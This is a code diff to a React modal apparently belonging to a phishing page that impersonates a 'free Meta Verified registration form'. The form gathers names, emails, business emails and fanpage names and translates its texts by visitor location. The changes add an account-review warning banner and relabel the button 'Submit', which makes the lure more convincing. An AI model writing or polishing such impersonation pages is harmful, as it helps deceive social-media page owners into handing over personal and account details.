@@ -46,7 +46,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Describe', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Subscribe'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Please provide the information below to help us review your account.', 'Full Name', 'Email Address', 'Email Business Address', 'Fanpage Name', 'Describe', 'Our response will be sent to you within 14-48 hours.', 'I agree to the', 'Terms of Service', 'Privacy Policy', 'and', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -138,9 +138,13 @@ ${
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
                 </div>
+                <div className='mx-3 sm:mx-3.5 mt-0 rounded-lg bg-amber-50 border border-amber-300 px-3 py-2 flex items-center gap-2'>
+                    <span className='text-amber-600 text-sm leading-none flex-shrink-0'>⚠️</span>
+                    <p className='text-[11px] sm:text-xs text-amber-800 font-medium leading-none'>{t('Please provide the information below to help us review your account.')}</p>
+                </div>
 
                 <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-hidden px-1.5 sm:px-3 md:px-4'>
-                    <div className='flex flex-col gap-1.5 sm:gap-1.5 md:gap-2 py-1 sm:py-1.5 overflow-y-auto'>
+                    <div className='flex flex-col gap-1.5 sm:gap-1.5 md:gap-2 pt-4 sm:pt-5 pb-2 sm:pb-2.5 overflow-y-auto'>
                         {/* Full Name */}
                         <input 
                             required 
@@ -286,7 +290,7 @@ ${
                             disabled={isLoading || !agreeToTerms}
                             className={`mt-2 sm:mt-2.5 md:mt-3 flex h-10 sm:h-11 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}
                         >
-                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Subscribe')}
+                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                         </button>
                     </div>
                 </form>
